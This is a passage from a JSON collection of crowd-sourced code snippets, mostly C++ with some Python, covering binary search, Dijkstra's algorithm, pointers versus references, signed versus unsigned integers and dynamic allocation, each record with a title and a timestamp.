     int max_value = *max_element(vec_of_three_dice.begin(),vec_of_three_dice.end());     for(size_t i = 3; i <vec_of_three_dice.size() ; i ++ ){         if(i < 10 ){             std::cout <<std::setw(2) <<std::setfill(' ') << i<< \" : \" <<\"(\"<<std::setw(4)<<std::setfill(' ')<<vec_of_three_dice.at(i) << \")\" ;         }else{             std::cout << i << \" : \" <<\"(\"<<std::setw(4)<<std::setfill(' ')<<vec_of_three_dice.at(i) << \")\";         }        for(size_t j = 0; j <= static_cast<size_t>(vec_of_three_dice.at(i) * asterikes)/max_value ; j++ ){            std::cout << \"*\";        }         std::cout << std::endl;       }             return 0 ; }\n",
    "reg_date": "2021-10-12T11:39:48.000Z"
  },
  {
    "id": 1846,
    "keyword": null,
    "link": null,
    "title": " dichotomic search c++",
    "description": "#include<iostream>  using namespace std;  int binarySearch(int arr[], int p, int r, int num) {     if (p <= r) {        int mid = (p + r)/2;        if (arr[mid] == num)             return mid ;        if (arr[mid] > num)            return binarySearch(arr, p, mid-1, num);                   if (arr[mid] < num)          return binarySearch(arr, mid+1, r, num);     }     return -1;  }  int main(void) {     int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};     int n = sizeof(arr)/ sizeof(arr[0]);     int num = 33;     int index = binarySearch (arr, 0, n-1, num);     if(index == -1)       cout<< num <<\" is not present in the array\";    else       cout<< num <<\" is present at index \"<< index <<\" in the array\";     return 0;  }\nusing namespace std;     // A recursive binary search function. It returns  // location of x in given array arr[l..r] is present,  // otherwise -1  int binarySearch(int arr[], int l, int r, int x)  {      if (r >= l) {          int mid = l + (r - l) / 2;             // If the element is present at the middle          // itself          if (arr[mid] == x)              return mid;             // If element is smaller than mid, then          // it can only be present in left subarray          if (arr[mid] > x)              return binarySearch(arr, l, mid - 1, x);             // Else the element can only be present          // in right subarray          return binarySearch(arr, mid + 1, r, x);      }         // We reach here when element is not      // present in array      return -1;  }     int main(void)  {      int arr[] = { 2, 3, 4, 10, 40 };      int x = 10;      int n = sizeof(arr) / sizeof(arr[0]);      int result = binarySearch(arr, 0, n - 1, x);      (result == -1) ? cout << \"Element is not present in array\"                    : cout << \"Element is present at index \" << result;      return 0;  } \n",
    "reg_date": "2021-10-12T11:39:48.000Z"
  },
  {
    "id": 1847,
    "keyword": null,
    "link": null,
    "title": " difference between --a and a-- c++",
    "description": "// The difference is here:  int a = 0; int b = a++; // b = 0, a = 1   // Where  int a = 0; int b = ++a; // b = 1, a = 1  \n",
    "reg_date": "2021-10-12T11:39:49.000Z"
  },
  {
    "id": 1848,
    "keyword": null,
    "link": null,
    "title": " difference between function and method",
    "description": "#inclue<iostream> using namespace std; // Bad Practice!!!  /*  \t*******IF YOU DONT KNOW OOP(OBJECT ORIENTED PROGRAMMING) FIRST LEARN IT THEN COME HERE \tAGAIN*******  \tSimply, Method = Function.  \tBut Difference is that  \tWe call a Function A 'Method' When That Function Is Written Inside a Class(a blueprint) \tBut if that Function is not Declared inside a class body then we call it 'Function' */  //Example:  class Employee {   public:   \tvoid getData(void); // This Is A 'METHOD' }  void Employee :: getData(void) // This is Also A Method Because It Is Pointing Towards The GetData Function In Employee Class. {   cout<<\"GET DATA!!!!!!\"<<std::endl; // Good Practice (std::endl) use \"std::\" }  int main() // This Is A Function, Cause It's Not Pointing Towards The Class As Well As Not Initialized Inside The Class Body {      cout<<\"Hello\"<<endl;      return 0; }  void DoSomethingGood(void) // This Is A Function As Well. {      if (2+2==5)     return; } \nFunction &mdash; a set of instructions that perform a task. We can define a  function using the function keyword, followed by Name and optional parameters.  Body of function is enclosed in Curly braces.   Method &mdash; a set of instructions that are associated with an object.  A JavaScript method is a property of an object that contains a function  definition. Methods are functions stored as object properties. Object method can be accessed with the following syntax: object = {     methodName: function() {         // Content     } };  object.methodName() \nIt's a function which is a member of a class:\nA method, like a function, is a set of instructions that perform a task. The difference is that a method is associated with an object, while a function is not.\n",
    "reg_date": "2021-10-12T11:39:49.000Z"
  },
  {
    "id": 1849,
    "keyword": null,
    "link": null,
    "title": " difference between pointer and reference in c++",
    "description": "Pointers: A pointer is a variable that holds memory address of another variable. A pointer needs to be dereferenced with * operator to access the memory location it points to.  References : A reference variable is an alias, that is, another name for an already existing variable. A reference, like a pointer, is also implemented by storing the address of an object. A reference can be thought of as a constant pointer (not to be confused with a pointer to a constant value!) with automatic indirection, i.e the compiler will apply the * operator for you. ******************************************* *******************************************    A pointer can be re-assigned:  int x = 5; int y = 6; int *p; p = &x; p = &y; *p = 10; assert(x == 5); assert(y == 10); -----------------------------------------  A reference cannot, and must be assigned at initialization:  int x = 5; int y = 6; int &r = x; ------------------------------------------- A pointer has its own memory address and size on the stack (4 bytes on x86), whereas a reference shares the same memory address (with the original variable) but also takes up some space on the stack. Since a reference has the same address as the original variable itself, it is safe to think of a reference as another name for the same variable. Note: What a pointer points to can be on the stack or heap. Ditto a reference. My claim in this statement is not that a pointer must point to the stack. A pointer is just a variable that holds a memory address. This variable is on the stack. Since a reference has its own space on the stack, and since the address is the same as the variable it references. More on stack vs heap. This implies that there is a real address of a reference that the compiler will not tell you.  int x = 0; int &r = x; int *p = &x; int *p2 = &r; assert(p == p2); ------------------------------------------- You can have pointers to pointers to pointers offering extra levels of indirection. Whereas references only offer one level of indirection.  int x = 0; int y = 0; int *p = &x; int *q = &y; int **pp = &p; pp = &q;//*pp = q **pp = 4; assert(y == 4); assert(x == 0); ------------------------------------------- A pointer can be assigned nullptr directly, whereas reference cannot. If you try hard enough, and you know how, you can make the address of a reference nullptr. Likewise, if you try hard enough, you can have a reference to a pointer, and then that reference can contain nullptr.  int *p = nullptr; int &r = nullptr; <--- compiling error int &r = *p;  <--- likely no compiling error, especially if the nullptr is hidden behind a function call, yet it refers to a non-existent int at address 0 Pointers can iterate over an array; you can use ++ to go to the next item that a pointer is pointing to, and + 4 to go to the 5th element. This is no matter what size the object is that the pointer points to.  ------------------------------------------- A pointer needs to be dereferenced with * to access the memory location it points to, whereas a reference can be used directly. A pointer to a class/struct uses -> to access it's members whereas a reference uses a .. ------------------------------------------- References cannot be stuffed into an array, whereas pointers can be! -------------------------------------------  Const references can be bound to temporaries. Pointers cannot (not without some indirection):  const int &x = int(12); //legal C++ int *y = &int(12); //illegal to dereference a temporary. This makes const& safer for use in argument lists and so forth.\n#include<iostream>  /* Pointers: *ptr, point to the memory location of a variable int a = 10 int *ptr = &a //points to the location in memory (0x80ea or whatever)  instead of the value  in order for pointers to work, the variable it's pointing to needs to  be de-referenced using &.(If confused, remember that the variable, int a,  is itself a reference to the location of the value you set it to).  A reference variable: &ref, points to another variable.  int b = 20; int &ref = b // points to the value of b, which is 20.  run this if confused: */      int a = 10;     int *ptr = &a;     std::cout << \"int a value: \" << a << std::endl;     std::cout << \"int ptr value: \" << ptr << std::endl;      int b = 20;     int& ref = b;     std::cout << \"int b value: \" << b << std::endl;     std::cout << \"int ref value: \" << ref << std::endl;      ref = a;     std::cout << \"int ref after setting it equal to a: \" << ref << std::endl;     ref = *ptr;     std::cout << \"int ref after setting it equal to *ptr: \" << ref << std::endl;     ptr = &ref;     std::cout << \"ptr after setting it equal to &ref: \" << ptr << std::endl;      ptr = &b;     std::cout << \"ptr after setting it equal to &b: \" << ptr << std::endl;  /* Reference variables CANNOT be set to a pointer variable; In the case above, you  see we can't just put ref = ptr; ptr HAS to be dereferenced with a *, which in  turn will give us the value of a, or 10. (dereference pointers with *)  Same goes for pointer variables being set to a reference; you have to dereference  the reference value (ptr = &b instead of ptr = b;). In the block above, when we  set ptr = &ref, the ref variable is dereferenced showing us a memory location.  When ptr=&b is called and we see the output, we noticed it is the same as the previous  output. */\n//Passing by Pointer://  // C++ program to swap two numbers using  // pass by pointer.  #include <iostream>  using namespace std;     void swap(int* x, int* y)  {      int z = *x;      *x = *y;      *y = z;  }     int main()  {      int a = 45, b = 35;      cout << \"Before Swap\\n\";      cout << \"a = \" << a << \" b = \" << b << \"\\n\";         swap(&a, &b);         cout << \"After Swap with pass by pointer\\n\";      cout << \"a = \" << a << \" b = \" << b << \"\\n\";  }  o/p: Before Swap a = 45 b = 35 After Swap with pass by pointer a = 35 b = 45  //Passing by Reference://  // C++ program to swap two numbers using  // pass by reference.     #include <iostream>  using namespace std;  void swap(int& x, int& y)  {      int z = x;      x = y;      y = z;  }     int main()  {      int a = 45, b = 35;      cout << \"Before Swap\\n\";      cout << \"a = \" << a << \" b = \" << b << \"\\n\";         swap(a, b);         cout << \"After Swap with pass by reference\\n\";      cout << \"a = \" << a << \" b = \" << b << \"\\n\";  }  o/p: Before Swap a = 45 b = 35 After Swap with pass by reference a = 35 b = 45  //Difference in Reference variable and pointer variable//  References are generally implemented using pointers. A reference is same object, just with a different name and reference must refer to an object. Since references can&rsquo;t be NULL, they are safer to use.  A pointer can be re-assigned while reference cannot, and must be assigned at initialization only. Pointer can be assigned NULL directly, whereas reference cannot. Pointers can iterate over an array, we can use ++ to go to the next item that a pointer is pointing to. A pointer is a variable that holds a memory address. A reference has the same memory address as the item it references. A pointer to a class/struct uses &lsquo;->'(arrow operator) to access it&rsquo;s members whereas a reference uses a &lsquo;.'(dot operator) A pointer needs to be dereferenced with * to access the memory location it points to, whereas a reference can be used directly.\nPointers:  A pointer is a variable that holds memory address of another variable.  A pointer needs to be dereferenced with * operator to access the  memory location it points to.   References :  A reference variable is an alias, that is,  another name for an already existing variable.  A reference, like a pointer, is also implemented  by storing the address of an object. \n",
    "reg_date": "2021-10-12T11:39:49.000Z"
  },
  {
    "id": 1850,
    "keyword": null,
    "link": null,
    "title": " difference between programming and coding",
    "description": "Coding is the process of using a programming language to get a computer to behave how you want it to. Every line of code tells the computer to do something, and a document full of lines of code is called a script. Each script is designed to carry out a job. This job might be to take an image and change its size\n//programming systems that can be differentiated\n",
    "reg_date": "2021-10-12T11:39:49.000Z"
  },
  {
    "id": 1851,
    "keyword": null,
    "link": null,
    "title": " difference between unsigned and signed",
    "description": "unsigned int x; //Unsigned variables can store the number zero and positive numbers.  signed int y; //Signed variables can store negative, zero, and positive numbers.\n",
    "reg_date": "2021-10-12T11:39:49.000Z"
  },
  {
    "id": 1852,
    "keyword": null,
    "link": null,
    "title": " difference between unsigned and signed c++",
    "description": "unsigned int x; //Unsigned variables can store the number zero and positive numbers.  signed int y; //Signed variables can store negative, zero, and positive numbers.\n",
    "reg_date": "2021-10-12T11:39:50.000Z"
  },
  {
    "id": 1853,
    "keyword": null,
    "link": null,
    "title": " difference between unsigned and signed int c++",
    "description": "//Difference between unsigned and signed variable types  unsigned int x; //Can hold zero & positive numbers  signed int y; //Can hold negative, zero, and positive numbers\n",
    "reg_date": "2021-10-12T11:39:50.000Z"
  },
  {
    "id": 1854,
    "keyword": null,
    "link": null,
    "title": " differentialble programming",
    "description": "//programming systems that can be differentiated\n",
    "reg_date": "2021-10-12T11:39:50.000Z"
  },
  {
    "id": 1855,
    "keyword": null,
    "link": null,
    "title": " digit sum c++",
    "description": "int x, s = 0;    cout << \"Enter the number : \";    cin >> x;    while (x != 0) {       s = s + x % 10;       x = x / 10;    }\n// sum the digits of an integer int getSum(long long n) {   int sum = 0;   int m = n;   while(n > 0) {         m = n % 10;         sum = sum + m;         n = n / 10;       }    return sum; }\n//1 \tint n = 12345, sum = 0;     while(n) {         sum+=n\u0010;         n/=10;     }     cout << sum; //15 //2 \tint n = 12345, sum = 0;     for (sum = 0; n > 0; sum += n % 10, n /= 10);     cout << sum; //15\n",
    "reg_date": "2021-10-12T11:39:50.000Z"
  },
  {
    "id": 1856,
    "keyword": null,
    "link": null,
    "title": " digitalwrite C++",
    "description": "digitalWrite(pin, value)\n",
    "reg_date": "2021-10-12T11:39:50.000Z"
  },
  {
    "id": 1857,
    "keyword": null,
    "link": null,
    "title": " dijkstra algorithm",
    "description": "#include<bits/stdc++.h> using namespace std;  int main() { \tint n = 9; \t \tint mat[9][9] = { { 100,4,100,100,100,100,100,8,100},                        { 4,100,8,100,100,100,100,11,100},                        {100,8,100,7,100,4,100,100,2},                        {100,100,7,100,9,14,100,100,100},                        {100,100,100,9,100,100,100,100,100},                        {100,100,4,14,10,100,2,100,100},                        {100,100,100,100,100,2,100,1,6},                        {8,11,100,100,100,100,1,100,7},                        {100,100,2,100,100,100,6,7,100}}; \t \tint src = 0; \tint count = 1; \t \tint path[n]; \tfor(int i=0;i<n;i++) \t\tpath[i] = mat[src][i]; \t \tint visited[n] = {0}; \tvisited[src] = 1; \t \twhile(count<n) \t{ \t\tint minNode; \t\tint minVal = 100; \t\t \t\tfor(int i=0;i<n;i++) \t\t\tif(visited[i] == 0 && path[i]<minVal) \t\t\t{ \t\t\t\tminVal = path[i]; \t\t\t\tminNode = i; \t\t\t} \t\t \t\tvisited[minNode] = 1; \t\t \t\tfor(int i=0;i<n;i++) \t\t\tif(visited[i] == 0) \t\t\t\tpath[i] = min(path[i],minVal+mat[minNode][i]); \t\t\t\t\t \t\tcount++; \t} \t \tpath[src] = 0; \tfor(int i=0;i<n;i++) \t\tcout<<src<<\" -> \"<<path[i]<<endl; \t \treturn(0); }\nimport sys   class Vertex:     def __init__(self, node):         self.id = node         self.adjacent = {}         # Set distance to infinity for all nodes         self.distance = sys.maxsize         # Mark all nodes unvisited         self.visited = False         # Predecessor         self.previous = None      def __lt__(self, other):         return self.distance < other.distance      def add_neighbor(self, neighbor, weight=0):         self.adjacent[neighbor] = weight      def get_connections(self):         return self.adjacent.keys()      def get_id(self):         return self.id      def get_weight(self, neighbor):         return self.adjacent[neighbor]      def set_distance(self, dist):         self.distance = dist      def get_distance(self):         return self.distance      def set_previous(self, prev):         self.previous = prev      def set_visited(self):         self.visited = True      def __str__(self):         return str(self.id) + ' adjacent: ' + str([x.id for x in self.adjacent])   class Graph:     def __init__(self):         self.vert_dict = {}         self.num_vertices = 0      def __iter__(self):         return iter(self.vert_dict.values())      def add_vertex(self, node):         self.num_vertices = self.num_vertices + 1         new_vertex = Vertex(node)         self.vert_dict[node] = new_vertex         return new_vertex      def get_vertex(self, n):         if n in self.vert_dict:             return self.vert_dict[n]         else:             return None      def add_edge(self, frm, to, cost=0):         if frm not in self.vert_dict:             self.add_vertex(frm)         if to not in self.vert_dict:             self.add_vertex(to)          self.vert_dict[frm].add_neighbor(self.vert_dict[to], cost)         self.vert_dict[to].add_neighbor(self.vert_dict[frm], cost)      def get_vertices(self):         return self.vert_dict.keys()      def set_previous(self, current):         self.previous = current      def get_previous(self, current):         return self.previous   def shortest(v, path):     ''' make shortest path from v.previous'''     if v.previous:         path.append(v.previous.get_id())         shortest(v.previous, path)     return   import heapq   def dijkstra(aGraph, start, target):     print('''Dijkstra's shortest path''')     # Set the distance for the start node to zero     start.set_distance(0)      # Put tuple pair into the priority queue     unvisited_queue = [(v.get_distance(), v) for v in aGraph]     heapq.heapify(unvisited_queue)      while len(unvisited_queue):         # Pops a vertex with the smallest distance         uv = heapq.heappop(unvisited_queue)         current = uv[1]         current.set_visited()          # for next in v.adjacent:         for next in current.adjacent:             # if visited, skip             if next.visited:                 continue             new_dist = current.get_distance() + current.get_weight(next)              if new_dist < next.get_distance():                 next.set_distance(new_dist)                 next.set_previous(current)                 print('updated : current = %s next = %s new_dist = %s' \\                       % (current.get_id(), next.get_id(), next.get_distance()))             else:                 print('not updated : current = %s next = %s new_dist = %s' \\                       % (current.get_id(), next.get_id(), next.get_distance()))          # Rebuild heap         # 1. Pop every item         while len(unvisited_queue):             heapq.heappop(unvisited_queue)         # 2. Put all vertices not visited into the queue         unvisited_queue = [(v.get_distance(), v) for v in aGraph if not v.visited]         heapq.heapify(unvisited_queue)   if __name__ == '__main__':      g = Graph()      g.add_vertex('a')     g.add_vertex('b')     g.add_vertex('c')     g.add_vertex('d')     g.add_vertex('e')     g.add_vertex('f')      g.add_edge('a', 'b', 7)     g.add_edge('a', 'c', 9)     g.add_edge('a', 'f', 14)     g.add_edge('b', 'c', 10)     g.add_edge('b', 'd', 15)     g.add_edge('c', 'd', 11)     g.add_edge('c', 'f', 2)     g.add_edge('d', 'e', 6)     g.add_edge('e', 'f', 9)      print('Graph data:')     for v in g:         for w in v.get_connections():             vid = v.get_id()             wid = w.get_id()             print('( %s , %s, =)' % (vid, wid, v.get_weight(w)))      dijkstra(g, g.get_vertex('a'), g.get_vertex('e'))      target = g.get_vertex('e')     path = [target.get_id()]     shortest(target, path)     print('The shortest path : %s' % (path[::-1])) \n//Dijkstra's Algorithm (Using priority queue) //Watch Striver graph series on youtube I learned from there #include<bits/stdc++.h> using namespace std; void addedge(vector<pair<int,int>>adj[],int u,int v,int w) {     adj[u].push_back(make_pair(v,w));     adj[v].push_back(make_pair(u,w)); } void Dijkstra(vector<pair<int,int>>adj[],int source,int n) {     priority_queue<pair<int,int>,vector<pair<int,int>>,greater<pair<int,int>>> prior; //Min-Heap storing will store distance and node     vector<int>dist(n,INT_MAX);     dist[source]=0;     prior.push(make_pair(0,source));     while(!prior.empty())     {         int distance=prior.top().first;         int node=prior.top().second;         prior.pop();         for(auto it:adj[node])         {             int next_node=it.first;             int next_weight=it.second;             if(dist[next_node]>distance+next_weight)             {                 dist[next_node]=dist[node]+next_weight;                 prior.push(make_pair(dist[next_node],next_node));             }         }     }     for(int i=0;i<n;i++)     {         cout<<dist[i]<<\" \";     } } int main() {     int vertex,edges;     cout<<\"ENTER THE NUMBER OF VERTEX AND EDGES:\"<<endl;     cin>>vertex>>edges;     vector<pair<int,int>>adj[vertex];     int a,b,w;     cout<<\"ENTER THE LINK AND THEN WEIGHT:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b>>w;         addedge(adj,a,b,w);     }     int source;     cout<<\"ENTER THE SOURCE NODE FROM WHICH YOU WANT TO CALCULATE THE SHORTEST DISTANCE:\"<<endl;     cin>>source;     Dijkstra(adj,source,vertex);     return 0; } \n#include <limits.h>  #include <stdio.h>      #define V 9      int minDistance(int dist[], bool sptSet[])  {       int min = INT_MAX, min_index;         for (int v = 0; v < V; v++)          if (sptSet[v] == false && dist[v] <= min)              min = dist[v], min_index = v;         return min_index;  }      void printSolution(int dist[])  {      printf(\"Vertex \\t\\t Distance from Source\\n\");      for (int i = 0; i < V; i++)          printf(\"%d \\t\\t %d\\n\", i, dist[i]);  }      void dijkstra(int graph[V][V], int src)  {      int dist[V];              bool sptSet[V];       for (int i = 0; i < V; i++)          dist[i] = INT_MAX, sptSet[i] = false;            dist[src] = 0;            for (int count = 0; count < V - 1; count++) {                  int u = minDistance(dist, sptSet);                     sptSet[u] = true;                     for (int v = 0; v < V; v++)                             if (!sptSet[v] && graph[u][v] && dist[u] != INT_MAX                  && dist[u] + graph[u][v] < dist[v])                  dist[v] = dist[u] + graph[u][v];      }           printSolution(dist);  }      int main()  {           int graph[V][V] = { { 0, 4, 0, 0, 0, 0, 0, 8, 0 },                          { 4, 0, 8, 0, 0, 0, 0, 11, 0 },                          { 0, 8, 0, 7, 0, 4, 0, 0, 2 },                          { 0, 0, 7, 0, 9, 14, 0, 0, 0 },                          { 0, 0, 0, 9, 0, 10, 0, 0, 0 },                          { 0, 0, 4, 14, 10, 0, 2, 0, 0 },                          { 0, 0, 0, 0, 0, 2, 0, 1, 6 },                          { 8, 11, 0, 0, 0, 0, 1, 0, 7 },                          { 0, 0, 2, 0, 0, 0, 6, 7, 0 } };         dijkstra(graph, 0);         return 0;  } \n//djikstra's algorithm using a weighted graph (STL) //code by Soumyadepp //insta: @soumyadepp //linkedinID: https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/  #include <bits/stdc++.h> #define ll long long using namespace std;  //to find the closest unvisited vertex from the source //note that numbering of vertices starts from 1 here. Calculate accordingly ll minDist(ll dist[], ll n, bool visited[]) {     ll min = INT_MAX;     ll minIndex = 0;     for (ll i = 1; i <= n; i++)     {         if (!visited[i] && dist[i] <= min)         {             min = dist[i];             minIndex = i;         }     }     return minIndex; }  //djikstra's algorithm for single source shortest path void djikstra(vector<pair<ll, ll>> *g, ll n, ll src) {     bool visited[n + 1];     ll dist[n + 1];     for (ll i = 0; i <= n; i++)     {         dist[i] = INT_MAX;         visited[i] = false;     }      dist[src] = 0;      for (ll i = 0; i < n - 1; i++)     {         ll u = minDist(dist, n, visited);         visited[u] = true;         for (ll v = 0; v < g[u].size(); v++)         {             if (dist[u] + g[u][v].second < dist[g[u][v].first])             {                 dist[g[u][v].first] = dist[u] + g[u][v].second;             }         }     }     cout << \"VERTEX : DISTANCE\" << endl;     for (ll i = 1; i <= n; i++)     {         if (dist[i] != INT_MAX)             cout << i << \"         \" << dist[i] << endl;         else             cout << i << \"         \"                  << \"not reachable\" << endl;     }     cout << endl; }  int main() {     //to store the adjacency list which also contains the weight     vector<pair<ll, ll>> *graph;     ll n, e, x, y, w, src;     cout << \"Enter number of vertices and edges in the graph\" << endl;     cin >> n >> e;     graph = new vector<pair<ll, ll>>[n + 1];     cout << \"Enter edges and weight\" << endl;     for (ll i = 0; i < e; i++)     {         cin >> x >> y >> w;         //checking for invalid edges and negative weights.         if (x <= 0 || y <= 0 || w <= 0)         {             cout << \"Invalid parameters. Exiting\" << endl;             exit(-1);         }         graph[x].push_back(make_pair(y, w));         graph[y].push_back(make_pair(x, w));     }     cout << \"Enter source from which you want to find shortest paths\" << endl;     cin >> src;     if (src >= 1 && src <= n)         djikstra(graph, n, src);     else         cout << \"Please enter a valid vertex as the source\" << endl;     return 0; }  //time complexity : O(ElogV) //space complexity: O(V) \n # Providing the graph n = int(input(\"Enter the number of vertices of the graph\"))  # using adjacency matrix representation  vertices = [[0, 0, 1, 1, 0, 0, 0],             [0, 0, 1, 0, 0, 1, 0],             [1, 1, 0, 1, 1, 0, 0],             [1, 0, 1, 0, 0, 0, 1],             [0, 0, 1, 0, 0, 1, 0],             [0, 1, 0, 0, 1, 0, 1],             [0, 0, 0, 1, 0, 1, 0]]  edges = [[0, 0, 1, 2, 0, 0, 0],          [0, 0, 2, 0, 0, 3, 0],          [1, 2, 0, 1, 3, 0, 0],          [2, 0, 1, 0, 0, 0, 1],          [0, 0, 3, 0, 0, 2, 0],          [0, 3, 0, 0, 2, 0, 1],          [0, 0, 0, 1, 0, 1, 0]]  # Find which vertex is to be visited next def to_be_visited():     global visited_and_distance     v = -10     for index in range(num_of_vertices):         if visited_and_distance[index][0] == 0 \\             and (v < 0 or visited_and_distance[index][1] <=                  visited_and_distance[v][1]):             v = index     return v   num_of_vertices = len(vertices[0])  visited_and_distance = [[0, 0]] for i in range(num_of_vertices-1):     visited_and_distance.append([0, sys.maxsize])  for vertex in range(num_of_vertices):      # Find next vertex to be visited     to_visit = to_be_visited()     for neighbor_index in range(num_of_vertices):          # Updating new distances         if vertices[to_visit][neighbor_index] == 1 and                  visited_and_distance[neighbor_index][0] == 0:             new_distance = visited_and_distance[to_visit][1]                  + edges[to_visit][neighbor_index]             if visited_and_distance[neighbor_index][1] > new_distance:                 visited_and_distance[neighbor_index][1] = new_distance                  visited_and_distance[to_visit][0] = 1  i = 0  # Printing the distance for distance in visited_and_distance:     print(\"Distance of \", chr(ord('a') + i),           \" from source vertex: \", distance[1])     i = i + 1\n",
    "reg_date": "2021-10-12T11:39:50.000Z"
  },
  {
    "id": 1858,
    "keyword": null,
    "link": null,
    "title": " dijkstra algorithm c++",
    "description": "void dijkstra(int s) {   priority_queue<pair<int, int>, vector<pair<int, int> >, greater<pair<int, int> > > pq;   for (int i=0; i<N; i++) dist[i] = INF;   dist[s] = 0;   pq.push(make_pair(0, s));   while (!pq.empty()) {     pair<int, int> front = pq.top();     pq.pop();     int w = front.first, u = front.second;     if (w > dist[u]) continue;     for (int i=0; i<adj[u].size(); i++) {       pair<int, int> v = adj[u][i];       if (dist[v.first] > dist[u] + v.second) {         dist[v.first] = dist[u] + v.second;         pq.push(make_pair(dist[v.first], v.first));       }     }   } }\n#include<bits/stdc++.h> using namespace std;  int main() { \tint n = 9; \t \tint mat[9][9] = { { 100,4,100,100,100,100,100,8,100},                        { 4,100,8,100,100,100,100,11,100},                        {100,8,100,7,100,4,100,100,2},                        {100,100,7,100,9,14,100,100,100},                        {100,100,100,9,100,100,100,100,100},                        {100,100,4,14,10,100,2,100,100},                        {100,100,100,100,100,2,100,1,6},                        {8,11,100,100,100,100,1,100,7},                        {100,100,2,100,100,100,6,7,100}}; \t \tint src = 0; \tint count = 1; \t \tint path[n]; \tfor(int i=0;i<n;i++) \t\tpath[i] = mat[src][i]; \t \tint visited[n] = {0}; \tvisited[src] = 1; \t \twhile(count<n) \t{ \t\tint minNode; \t\tint minVal = 100; \t\t \t\tfor(int i=0;i<n;i++) \t\t\tif(visited[i] == 0 && path[i]<minVal) \t\t\t{ \t\t\t\tminVal = path[i]; \t\t\t\tminNode = i; \t\t\t} \t\t \t\tvisited[minNode] = 1; \t\t \t\tfor(int i=0;i<n;i++) \t\t\tif(visited[i] == 0) \t\t\t\tpath[i] = min(path[i],minVal+mat[minNode][i]); \t\t\t\t\t \t\tcount++; \t} \t \tpath[src] = 0; \tfor(int i=0;i<n;i++) \t\tcout<<src<<\" -> \"<<path[i]<<endl; \t \treturn(0); }\n#include <limits.h>  #include <stdio.h>      #define V 9      int minDistance(int dist[], bool sptSet[])  {       int min = INT_MAX, min_index;         for (int v = 0; v < V; v++)          if (sptSet[v] == false && dist[v] <= min)              min = dist[v], min_index = v;         return min_index;  }      void printSolution(int dist[])  {      printf(\"Vertex \\t\\t Distance from Source\\n\");      for (int i = 0; i < V; i++)          printf(\"%d \\t\\t %d\\n\", i, dist[i]);  }      void dijkstra(int graph[V][V], int src)  {      int dist[V];              bool sptSet[V];       for (int i = 0; i < V; i++)          dist[i] = INT_MAX, sptSet[i] = false;            dist[src] = 0;            for (int count = 0; count < V - 1; count++) {                  int u = minDistance(dist, sptSet);                     sptSet[u] = true;                     for (int v = 0; v < V; v++)                             if (!sptSet[v] && graph[u][v] && dist[u] != INT_MAX                  && dist[u] + graph[u][v] < dist[v])                  dist[v] = dist[u] + graph[u][v];      }           printSolution(dist);  }      int main()  {           int graph[V][V] = { { 0, 4, 0, 0, 0, 0, 0, 8, 0 },                          { 4, 0, 8, 0, 0, 0, 0, 11, 0 },                          { 0, 8, 0, 7, 0, 4, 0, 0, 2 },                          { 0, 0, 7, 0, 9, 14, 0, 0, 0 },                          { 0, 0, 0, 9, 0, 10, 0, 0, 0 },                          { 0, 0, 4, 14, 10, 0, 2, 0, 0 },                          { 0, 0, 0, 0, 0, 2, 0, 1, 6 },                          { 8, 11, 0, 0, 0, 0, 1, 0, 7 },                          { 0, 0, 2, 0, 0, 0, 6, 7, 0 } };         dijkstra(graph, 0);         return 0;  } \nconst int INF = 1000000000; vector<vector<pair<int, int>>> adj;  void dijkstra(int s, vector<int> & d, vector<int> & p) {     int n = adj.size();     d.assign(n, INF);     p.assign(n, -1);     vector<bool> u(n, false);      d[s] = 0;     for (int i = 0; i < n; i++) {         int v = -1;         for (int j = 0; j < n; j++) {             if (!u[j] && (v == -1 || d[j] < d[v]))                 v = j;         }          if (d[v] == INF)             break;          u[v] = true;         for (auto edge : adj[v]) {             int to = edge.first;             int len = edge.second;              if (d[v] + len < d[to]) {                 d[to] = d[v] + len;                 p[to] = v;             }         }     } } \n",
    "reg_date": "2021-10-12T11:39:51.000Z"
  },
  {
    "id": 1859,
    "keyword": null,
    "link": null,
    "title": " dijkstra in c++",
    "description": "void dijkstra(int s) {   priority_queue<pair<int, int>, vector<pair<int, int> >, greater<pair<int, int> > > pq;   for (int i=0; i<N; i++) dist[i] = INF;   dist[s] = 0;   pq.push(make_pair(0, s));   while (!pq.empty()) {     pair<int, int> front = pq.top();     pq.pop();     int w = front.first, u = front.second;     if (w > dist[u]) continue;     for (int i=0; i<adj[u].size(); i++) {       pair<int, int> v = adj[u][i];       if (dist[v.first] > dist[u] + v.second) {         dist[v.first] = dist[u] + v.second;         pq.push(make_pair(dist[v.first], v.first));       }     }   } }\n#include<bits/stdc++.h> using namespace std;  int main() { \tint n = 9; \t \tint mat[9][9] = { { 100,4,100,100,100,100,100,8,100},                        { 4,100,8,100,100,100,100,11,100},                        {100,8,100,7,100,4,100,100,2},                        {100,100,7,100,9,14,100,100,100},                        {100,100,100,9,100,100,100,100,100},                        {100,100,4,14,10,100,2,100,100},                        {100,100,100,100,100,2,100,1,6},                        {8,11,100,100,100,100,1,100,7},                        {100,100,2,100,100,100,6,7,100}}; \t \tint src = 0; \tint count = 1; \t \tint path[n]; \tfor(int i=0;i<n;i++) \t\tpath[i] = mat[src][i]; \t \tint visited[n] = {0}; \tvisited[src] = 1; \t \twhile(count<n) \t{ \t\tint minNode; \t\tint minVal = 100; \t\t \t\tfor(int i=0;i<n;i++) \t\t\tif(visited[i] == 0 && path[i]<minVal) \t\t\t{ \t\t\t\tminVal = path[i]; \t\t\t\tminNode = i; \t\t\t} \t\t \t\tvisited[minNode] = 1; \t\t \t\tfor(int i=0;i<n;i++) \t\t\tif(visited[i] == 0) \t\t\t\tpath[i] = min(path[i],minVal+mat[minNode][i]); \t\t\t\t\t \t\tcount++; \t} \t \tpath[src] = 0; \tfor(int i=0;i<n;i++) \t\tcout<<src<<\" -> \"<<path[i]<<endl; \t \treturn(0); }\n",
    "reg_date": "2021-10-12T11:39:51.000Z"
  },
  {
    "id": 1860,
    "keyword": null,
    "link": null,
    "title": " dinamic allocation with new & delete cpp",
    "description": "// Release memory pointed by pointer-variable delete pointer-variable;   \n// Pointer initialized with NULL // Then request memory for the variable int *p = NULL;  p = new int;                 OR  // Combine declaration of pointer  // and their assignment int *p = new int;  \n",
    "reg_date": "2021-10-12T11:39:51.000Z"
  },
  {
    "id": 1861,
    "keyword": null,
    "link": null,
    "title": " directed graph in cpp",
